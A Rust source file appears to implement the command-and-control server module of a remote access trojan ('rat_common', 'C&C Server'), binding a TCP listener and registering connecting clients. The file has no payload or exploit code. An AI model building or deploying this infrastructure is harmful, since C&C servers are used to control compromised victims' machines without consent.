mod client;
mod listener;
mod ping;

use std::collections::HashMap;
use std::collections::hash_map::Entry;
use std::io;
use std::net::SocketAddr;
use std::sync::Arc;

use async_trait::async_trait;
use log::{debug, warn};
use rat_common::framework::{ModuleImpl, ModuleState};
use tokio::net::{TcpListener, TcpStream, ToSocketAddrs};
use tokio::sync::RwLock;

use crate::config::Config;
use crate::modules::cc::client::ClientConnector;

pub struct CCServer {
    _listener: TcpListener,
    _config: Config,
    _clients: RwLock<HashMap<SocketAddr, Arc<ClientConnector>>>,
    _state: Arc<ModuleState>,
}

impl CCServer {
    pub async fn bind<A: ToSocketAddrs>(addr: A, config: Config) -> anyhow::Result<Arc<Self>> {
        let listener = TcpListener::bind(addr).await?;
        Ok(Arc::new(Self {
            _listener: listener,
            _config: config,
            _clients: RwLock::new(HashMap::new()),
            _state: ModuleState::new(),
        }))
    }
}

#[async_trait]
impl ModuleImpl for CCServer {
    type EventType = io::Result<(TcpStream, SocketAddr)>;

    fn name(&self) -> &str {
        "C&C Server"
    }

    fn state(&self) -> Arc<ModuleState> {
        self._state.clone()
    }

    async fn listen(self: Arc<Self>) -> Self::EventType {
        self._listener.accept().await
    }

    async fn handle(self: Arc<Self>, event: Self::EventType) -> anyhow::Result<()> {
        let (stream, addr) = event?;

        let mut clients = self._clients.write().await;
        if let Entry::Vacant(e) = clients.entry(addr) {
            let client = ClientConnector::new(stream, addr, self._config);
            self.add_submodule(client.clone()).await;
            e.insert(client);

            debug!("Accepted new connection from {addr}");
        } else {
            warn!("Client {addr} is trying to connect more than once. Ignoring.");
        }

        Ok(())
    }
}
